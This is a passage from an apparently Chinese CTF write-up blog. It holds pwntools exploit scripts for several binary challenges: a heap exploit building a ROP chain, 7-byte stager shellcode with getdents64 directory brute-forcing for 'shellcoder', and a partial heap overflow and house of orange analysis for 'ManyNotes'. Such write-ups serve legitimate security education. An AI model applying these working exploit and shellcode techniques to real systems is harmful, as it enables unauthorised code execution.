class="line">edit(<span class="number">3</span>,<span class="string">"%50$s"</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">k=p.recvuntil(<span class="string">"D"</span>)[:<span class="number">-1</span>]</span><br><span class="line">map_addr=u16(k)*<span class="number">0x10000</span></span><br><span class="line"><span class="keyword">print</span> hex(map_addr)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">"\x00"</span>*<span class="number">0x78</span>+p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)+p64(map_addr+<span class="number">0x60</span>))</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">open_addr=libc_addr+<span class="number">0xf7030</span></span><br><span class="line">read_addr=libc_addr+<span class="number">0xf7250</span></span><br><span class="line">write_addr=libc_addr+<span class="number">0xf72b0</span></span><br><span class="line">edit(<span class="number">3</span>,p64(stack_addr<span class="number">-0x7ffdcce76b80</span>+<span class="number">0x7ffdcce76ba8</span>)+p64(<span class="number">0x100</span>)+<span class="string">"./flag\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">magic_code=p64(exec_addr+<span class="number">0x1433</span>)+p64(map_addr+<span class="number">0x80</span>)+p64(exec_addr+<span class="number">0x1431</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">magic_code+=p64(exec_addr+<span class="number">0x1433</span>)+p64(<span class="number">3</span>)+p64(exec_addr+<span class="number">0x1431</span>)+p64(map_addr+<span class="number">0x70</span>)+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x101ffc</span>)+p64(<span class="number">40</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">magic_code+=p64(exec_addr+<span class="number">0x1329</span>)<span class="comment">#p64(exec_addr+0x1433)+p64(0)+p64(exec_addr+0x1431)+p64(map_addr)+p64(0)+p64(libc_addr+0x101ffc)+p64(20)+p64(0)+p64(write_addr)</span></span><br><span class="line">edit(<span class="number">7</span>,magic_code)</span><br><span class="line">p.sendlineafter(<span class="string">"Index: "</span>,<span class="string">"3"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x02-shellcoder"><a href="#0x02-shellcoder" class="headerlink" title="0x02 shellcoder"></a>0x02 shellcoder</h2><h3 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h3><p>打开程序即可看到，其是使用syscall完成几个基本操作:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  alarm();</span><br><span class="line">  <span class="built_in">write</span>();</span><br><span class="line">  v3 = (_QWORD *)mmap();</span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = <span class="number">0xF4F4F4F4F4F4F4F4</span>LL;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">0xF4F4F4F4F4F4F4F4</span>LL;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0xF4F4F4F4F4F4F4F4</span>LL;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0xF4F4F4F4F4F4F4F4</span>LL;</span><br><span class="line">  <span class="built_in">read</span>();                        <span class="comment">// 读取7位</span></span><br><span class="line">  jmp_rdi(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到程序即:<br>mmap一个地址，而后读入7字节shellcode，最后转去shellcode执行<br>看到shellcode前jmp时候寄存器状态:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RBX  0x0</span><br><span class="line">RCX  0x0</span><br><span class="line">RDX  0x0</span><br><span class="line">RDI  0x7ffff7ff3000 </span><br><span class="line">RSI  0x0</span><br><span class="line">R8   0x0</span><br><span class="line">R9   0x0</span><br><span class="line">R10  0x0</span><br><span class="line">R11  0x0</span><br><span class="line">R12  0x0</span><br><span class="line">R13  0x0</span><br><span class="line">R14  0x0</span><br><span class="line">R15  0x0</span><br><span class="line">RBP  0x0</span><br><span class="line">RSP  0x7fffffffdb48 ◂— 0xabadc0defee1dead</span><br><span class="line">RIP  0x5555555544c7 ◂— jmp    rdi</span><br></pre></td></tr></table></figure>
<p>rdi为mmap地址<br>所以可以直接利用现有状态完成read(0,mmap_addr,size)操作，考虑到7字节限制，最后选择:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xchg rdi,rsi</span><br><span class="line">mov dl,0xff</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>这样即可继续写入shellcode，不过发现execv失败，猜测远程服务器限制了shell，不然题目也不会故意给出文件目录结构:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">├── flag</span><br><span class="line">│   ├── unknown</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   │       └── flag</span><br><span class="line">│   └── unknown</span><br><span class="line">└── shellcoder</span><br></pre></td></tr></table></figure>
<p>可以发现open read write还在，所以重点是找到flag位置<br>重新看了64位下的系统调用表,发现了比较好的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h</span><br><span class="line">......</span><br><span class="line">#define __NR_getdents 78</span><br><span class="line">#define __NR_getdents64 217</span><br></pre></td></tr></table></figure>
<p>直接利用getdents来读取目录结构即可，最后爆破发现每层4个，一共6层文件夹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">shellcode:</span><br><span class="line">fd=open(dir,<span class="string">"O_RDONLY|O_DIRECTORY"</span>)</span><br><span class="line">getdents64(fd,rsp,<span class="number">2048</span>) //将目录结构读入到栈</span><br><span class="line">write(<span class="number">1</span>,rsp,<span class="number">0x200</span>) //将栈上目录结构输出</span><br><span class="line">脚本:</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">key=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line"><span class="comment">#p=process("./shellcoder")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ans</span><span class="params">(f,s,ans)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> s[<span class="number">0</span>]==<span class="string">"\x03"</span>:</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x140</span>):</span><br><span class="line">          <span class="keyword">if</span> s[i] <span class="keyword">in</span> key <span class="keyword">and</span> s[i+<span class="number">1</span>] <span class="keyword">in</span> key <span class="keyword">and</span> s[i+<span class="number">2</span>] <span class="keyword">in</span> key <span class="keyword">and</span> s[i+<span class="number">3</span>] <span class="keyword">in</span> key:</span><br><span class="line">             ans.append(f+<span class="string">"/"</span>+s[i:i+<span class="number">4</span>])</span><br><span class="line">             i+=<span class="number">4</span></span><br><span class="line">       <span class="keyword">return</span> ans</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">k1=[]<span class="comment">#记录已获得文件夹</span></span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      p=remote(<span class="string">"139.180.215.222"</span>,<span class="number">20002</span>)</span><br><span class="line">      s=<span class="string">"xchg rdi,rsi\n\</span></span><br><span class="line"><span class="string">       mov dl,0xff\n\</span></span><br><span class="line"><span class="string">       syscall"</span></span><br><span class="line">      p.recvuntil(<span class="string">"hello shellcoder:"</span>)</span><br><span class="line">      p.send(asm(s))</span><br><span class="line">      m=<span class="string">"/flag/%s"</span>  %k1[i]</span><br><span class="line">      s2=shellcraft.pushstr(m)+<span class="string">"\nmov rsi,0x10000\n\</span></span><br><span class="line"><span class="string">        mov rdi,rsp\n\</span></span><br><span class="line"><span class="string">        mov rax,2\n\</span></span><br><span class="line"><span class="string">        syscall\n\</span></span><br><span class="line"><span class="string">        mov rbx,rax\n\</span></span><br><span class="line"><span class="string">        mov rdi,rax\n\</span></span><br><span class="line"><span class="string">        mov rsi,rsp\n\</span></span><br><span class="line"><span class="string">        mov rdx,2048\n\</span></span><br><span class="line"><span class="string">        mov rax,0xd9\n\</span></span><br><span class="line"><span class="string">        syscall\n\</span></span><br><span class="line"><span class="string">        mov rdi,1\n\</span></span><br><span class="line"><span class="string">        mov rsi,rsp\n\</span></span><br><span class="line"><span class="string">        mov rdx,0x200\n\</span></span><br><span class="line"><span class="string">        mov [rsp+8],rax\n\</span></span><br><span class="line"><span class="string">        mov rax,1\n\</span></span><br><span class="line"><span class="string">        mov [rsp],rbx\n\</span></span><br><span class="line"><span class="string">        syscall"</span></span><br><span class="line">      p.send(asm(s)+asm(s2))</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        get_ans(k1[i],p.recv(<span class="number">0x200</span>),ans)</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        p.close()</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">     i-=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> ans,len(ans)</span><br></pre></td></tr></table></figure>
<p>最后找到flag在”./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag”</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">p=remote(<span class="string">"139.180.215.222"</span>,<span class="number">20002</span>)</span><br><span class="line">s=<span class="string">"xchg rdi,rsi\n\</span></span><br><span class="line"><span class="string">   mov dl,0xff\n\</span></span><br><span class="line"><span class="string">   syscall"</span></span><br><span class="line">p.recvuntil(<span class="string">"hello shellcoder:"</span>)</span><br><span class="line">p.send(asm(s))</span><br><span class="line">p.send(asm(s)+asm(shellcraft.cat(<span class="string">"./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag"</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-ManyNotes"><a href="#0x03-ManyNotes" class="headerlink" title="0x03 ManyNotes"></a>0x03 ManyNotes</h2><h3 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h3><p>首先程序会读入一个name并输出，不过读入过程中没有”\x00”截断，所以存在leak</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> newthread; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x258</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your name: "</span>);</span><br><span class="line">  out_name();</span><br><span class="line">  <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0L</span>L, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))start_routine, <span class="number">0L</span>L) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  pthread_join(newthread, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着程序利用pthread_create新启动一个进程来进入主要部分:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      v4 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">0x2000</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        buf = <span class="built_in">malloc</span>(v4);</span><br><span class="line">        <span class="keyword">if</span> ( ++v1 &gt; <span class="number">0x10000</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Padding: "</span>);</span><br><span class="line">        v5 = get_num();</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">0x400</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 += v5;</span><br><span class="line">          <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10000</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">            <span class="built_in">malloc</span>(v4);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Input? (0/1): "</span>);</span><br><span class="line">          <span class="keyword">if</span> ( get_num() )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">            fake_read((__int64)buf, v4);</span><br><span class="line">            <span class="built_in">write</span>(<span class="number">1</span>, buf, v4);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Invalid Padding!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid Size!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Command!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到只能申请堆，无法释放，并且可以利用padding申请很多堆<br>而且在read过程中可以看到:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">fake_read</span><span class="params">(__int64 a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; a2; i += v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(a1 + i), a2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显的逻辑漏洞，存在溢出<br>立即想到house of orange，不过直接改top size并申请较大堆块发现并没有释放进unsorted bin，而是直接扩充了top chunk并分割出来，追踪sysmalloc的程序流发现了:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr (old_top);</span><br><span class="line">    old_heap_size = old_heap-&gt;<span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;system_mem += old_heap-&gt;<span class="built_in">size</span> - old_heap_size;</span><br><span class="line">        arena_mem += old_heap-&gt;<span class="built_in">size</span> - old_heap_size;</span><br><span class="line">        set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;<span class="built_in">size</span>) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                  | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">        heap-&gt;ar_ptr = av;</span><br><span class="line">        heap-&gt;prev = old_heap;</span><br><span class="line">        av-&gt;system_mem += heap-&gt;<span class="built_in">size</span>;</span><br><span class="line">        arena_mem += heap-&gt;<span class="built_in">size</span>;</span><br><span class="line">        <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">        top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">        set_head (top (av), (heap-&gt;<span class="built_in">size</span> - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">           MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">        <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">           become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">           up, too, although the chunk is marked in use. */</span></span><br><span class="line">        old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">        set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            set_head (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">      <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">      <span class="keyword">goto</span> try_mmap;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>新的进程里av并不是main arena，其会有一个新的mmap的地方存放堆信息<br>所以机制与正常情况下不一样，我们需要break这个条件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((long) (MINSIZE + nb - old_size) &gt; 0</span><br><span class="line">          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) &#x3D;&#x3D; 0)</span><br></pre></td></tr></table></figure>
